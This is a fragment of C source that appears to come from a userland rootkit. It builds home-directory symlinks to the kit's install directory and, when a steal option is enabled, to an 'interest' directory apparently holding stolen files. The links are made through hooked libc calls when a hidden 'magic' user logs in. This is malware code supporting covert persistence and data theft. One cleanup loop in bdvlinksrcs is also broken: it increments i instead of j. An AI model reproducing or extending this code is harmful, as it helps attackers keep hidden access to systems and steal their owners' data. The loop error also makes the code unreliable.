/* each char pointer array in the functions below must remain in order respective of each other for the correct intended behaviour. */

/* returns all full paths for our symlinks to live, in homedir. */
char **bdvlinkdests(int *c){
    if(!initmvbc())
        return NULL;

    char **ret;
    const char *const dest[] = {
        #ifdef ENABLE_STEAL
         "%s/interest",
        #endif
         "%s/install"
    };

    const size_t dsize = sizeofarr(dest),
                 homelen = strlen(mvbc->homedir);
    size_t i;
    ret = calloc(dsize, sizeof(char*));
    if(!ret) return NULL;
    for(i=0; i < dsize; i++){
        size_t s = homelen + strlen(dest[i]) + 2;
        ret[i] = malloc(s);
        if(!ret[i]){
            if(i != 0)
                for(size_t j=0; j<i; j++)
                    clean(ret[j]);
            free(ret);
            return NULL;
        }
        memset(ret[i], 0, s);
        snprintf(ret[i], s, dest[i], mvbc->homedir);
    }

    if(c != NULL) *c=i;
    return ret;
}

/* returns an array of all paths which will be linked to within homedir. */
char **bdvlinksrcs(int *c){
    if(!initmvbc())
        return NULL;

    const char *const linksrc[] = {
        #ifdef ENABLE_STEAL
         mvbc->interestdir,
        #endif
         mvbc->installdir
    };

    const size_t scsize = sizeofarr(linksrc);
    size_t i;
    char **ret = calloc(scsize, sizeof(char*));
    if(!ret) return NULL;
    for(i=0; i < scsize; i++){
        ret[i] = strdup(linksrc[i]);
        if(!ret[i]){
            if(i != 0)
                for(size_t j=0; j<i; i++)
                    clean(ret[j]);
            free(ret);
            return NULL;
        }
    }

    if(c != NULL) *c=i;
    return ret;
}

/* make all symlinks for kit things into homedir. this is called on magicusr login. */
void mkbdvlinks(void){
    u_int ok = 0, fail = 0, exist = 0;

    hook(CACCESS, CSYMLINK);

    char **srcs, **dests;
    int sc;
    if((srcs = bdvlinksrcs(&sc)) == NULL)
        return;
    else if((dests = bdvlinkdests(NULL)) == NULL){
        for(int i = 0; i < sc; i++)
            clean(srcs[i]);
        free(srcs);
        return;
    }

    for(int i = 0; i < sc; i++){
        int rv = (long)call(CACCESS, srcs[i], F_OK);
        if(rv < 0 && errno != ENOENT){
            ++fail;
            perror("access");
            clean(srcs[i]);
            clean(dests[i]);
            continue;
        }else if(rv < 0){
            clean(srcs[i]);
            clean(dests[i]);
            continue;
        }

        rv = (long)call(CSYMLINK, srcs[i], dests[i]);
        if(rv < 0 && errno == EEXIST){
            ++exist;
            clean(srcs[i]);
            clean(dests[i]);
            continue;
        }else if(rv < 0){
            ++fail;
            perror("symlink");
        }else ++ok;
        clean(srcs[i]);
        clean(dests[i]);
    }
    free(srcs);
    free(dests);

    if(ok > 0) bxprintf(SUCCESS_LINKS, ok);
    if(exist > 0) bxprintf(EXIST_LINKS, exist);
    if(fail > 0) bxprintf(FAIL_LINKS, fail);
}